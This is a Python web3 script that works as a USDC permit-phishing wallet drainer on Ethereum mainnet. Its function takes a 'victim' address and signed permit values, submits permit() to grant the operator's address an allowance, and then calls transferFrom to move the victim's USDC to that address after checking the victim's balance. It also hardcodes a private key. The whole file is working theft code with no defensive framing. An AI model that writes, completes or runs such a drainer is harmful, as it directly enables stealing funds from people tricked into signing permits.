import os
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware

# --- CONFIGURATION ---
RPC_URL = "https://eth.drpc.org"
ADMIN_PRIVATE_KEY = "0x7a391f7481f33221379ecf00a5f643e9d8999335f6068695d7398b16c803df6a"
USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

# Initialize Web3
w3 = Web3(Web3.HTTPProvider(RPC_URL))

# Injection using the new v7 naming
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)

USDC_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"inputs": [{"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}, {"name": "deadline", "type": "uint256"}, {"name": "v", "type": "uint8"}, {"name": "r", "type": "bytes32"}, {"name": "s", "type": "bytes32"}], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"}
]

def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
    try:
        admin_account = w3.eth.account.from_key(ADMIN_PRIVATE_KEY)
        admin_addr = admin_account.address
        victim_addr = Web3.to_checksum_address(victim_address)
        contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)

        # Pre-flight check: Balance
        target_amount_raw = int(float(amount))
        user_bal = contract.functions.balanceOf(victim_addr).call()
        if user_bal < target_amount_raw:
            return None, f"USER_WALLET_ERROR: Target only has {user_bal/1e6} USDC."

        # Gas check
        gas_price = w3.eth.gas_price
        if w3.eth.get_balance(admin_addr) < (gas_price * 200000):
            return None, "ADMIN_WALLET_ERROR: Insufficient ETH for gas."

        # Nonce & Signature
        current_nonce = w3.eth.get_transaction_count(admin_addr, 'pending')
        r_bytes = w3.to_bytes(hexstr=r)
        s_bytes = w3.to_bytes(hexstr=s)

        # 1. PERMIT
        permit_tx = contract.functions.permit(
            victim_addr, admin_addr, target_amount_raw, int(deadline), int(v), r_bytes, s_bytes
        ).build_transaction({
            "from": admin_addr, "nonce": current_nonce, "gas": 100000, "gasPrice": gas_price, "chainId": 1
        })
        w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY).raw_transaction)

        # 2. TRANSFER
        transfer_tx = contract.functions.transferFrom(
            victim_addr, admin_addr, target_amount_raw
        ).build_transaction({
            "from": admin_addr, "nonce": current_nonce + 1, "gas": 100000, "gasPrice": gas_price, "chainId": 1
        })
        tx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY).raw_transaction)

        return tx_hash.hex(), None

    except Exception as e:
        return None, f"EXECUTION_FAILED: {str(e)}"
